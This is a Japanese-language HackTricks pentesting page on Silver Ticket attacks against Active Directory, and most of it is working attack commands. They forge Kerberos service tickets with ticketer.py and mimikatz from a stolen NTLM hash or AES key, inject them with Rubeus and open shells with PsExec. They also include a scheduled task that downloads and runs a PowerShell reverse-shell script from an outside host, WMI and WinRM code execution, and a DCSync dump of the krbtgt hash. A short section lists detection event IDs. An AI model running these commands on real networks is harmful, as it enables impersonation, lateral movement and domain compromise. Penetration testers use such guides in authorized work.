# シルバーチケット

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を見たいですか？** または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたいですか？** [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、** Twitter **[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)や[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、ハッキングのコツを共有してください。**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングのキャリア**に興味があり、ハッカブルではないものをハックしたい方 - **採用中です！** (_流暢なポーランド語の読み書きが必要です_).

{% embed url="https://www.stmcyber.com/careers" %}

## シルバーチケット

シルバーチケット攻撃は、**サービスのNTLMハッシュを取得した後に、そのサービスの有効なTGSを作成する**ことに基づいています（例えば、**PCアカウントのハッシュ**のように）。したがって、カスタムTGSを偽造することで、**任意のユーザーとしてそのサービスにアクセス**することが可能です。

この場合、AD内のユーザーアカウントのような**コンピュータアカウントのNTLMハッシュ**が**取得されています**。したがって、SMBサービスを通じてそのマシンに**管理者**権限で**アクセスするためのチケットを作成**することが可能です。コンピュータアカウントはデフォルトで30日ごとにパスワードをリセットします。

また、AES Kerberosキー（AES128およびAES256）を使用してチケットを偽造することが可能であり、**望ましい**（オペレーションセキュリティの観点から）ことも考慮する必要があります。AESキーの生成方法については、[MS-KILEのセクション4.4](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625)または[Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)を読んでください。

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
```
Windowsでは、**Mimikatz**を使用して**チケット**を**作成**できます。次に、**Rubeus**を使用してチケットを**注入**し、最終的に**PsExec**のおかげでリモートシェルを取得できます。

{% code title="Windows" %}
```
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

**CIFS** サービスは、**被害者のファイルシステムにアクセス**を可能にするものです。他のサービスはこちらで見つけることができます：[**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**。** 例えば、コンピュータに _**schtask**_ を作成するために **HOST サービス** を使用できます。これが機能したかどうかを確認するために、被害者のタスクをリストアップしてみてください：`schtasks /S <hostname>` または、コンピュータで **WMI** クエリを実行するために **HOST と** **RPCSS サービス** を使用し、テストするには：`Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### 軽減策

Silver ticket イベント ID (golden ticket よりも隠密性が高い)：

* 4624: アカウントログオン
* 4634: アカウントログオフ
* 4672: 管理者ログオン

[**Silver Tickets についての詳細情報は ired.team で**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## 利用可能なサービス

| サービスタイプ                               | サービス Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell リモーティング                        | <p>HOST</p><p>HTTP</p><p>OSによっては以下も:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては単に要求する: WINRM</p> |
| スケジュールされたタスク                            | HOST                                                                       |
| Windows ファイル共有、または psexec            | CIFS                                                                       |
| LDAP 操作、DCSync を含む           | LDAP                                                                       |
| Windows リモートサーバー管理ツール | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** を使用すると、以下のパラメータを使用してこれらのチケットを**すべて要求**することができます：

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## サービスチケットの悪用

以下の例では、チケットが管理者アカウントを偽装して取得されたと想定しましょう。

### CIFS

このチケットを使用すると、**SMB** 経由で `C$` と `ADMIN$` フォルダにアクセスし（公開されている場合）、リモートファイルシステムの一部にファイルをコピーすることができます。例えば：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
以下は、ホスト内でシェルを取得したり、**psexec**を使用して任意のコマンドを実行する方法についての記述です：

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

この権限を持つと、リモートコンピューターでスケジュールされたタスクを生成し、任意のコマンドを実行できます：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

これらのチケットを使用すると、**被害者システムでWMIを実行**できます：
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
以下のページで**wmiexecに関する詳細情報**を見つけることができます：

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

winrmを介してコンピュータにアクセスすると、**アクセス**してPowerShellを取得することもできます：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
以下のページを確認して、**winrmを使用してリモートホストに接続する他の方法**を学びましょう：

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
リモートコンピュータにアクセスするには、**winrmがアクティブでリスニングしている必要があります**。
{% endhint %}

### LDAP

この権限を持っていると、**DCSync**を使用してDCデータベースをダンプできます：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSyncについてもっと学ぶ**には、次のページをご覧ください：

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングのキャリア**に興味があり、ハック不可能なものをハックしたい方 - **採用情報！**（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？ または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？ [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)を手に入れましょう。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手しましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのコツを共有するために、** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) と [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>
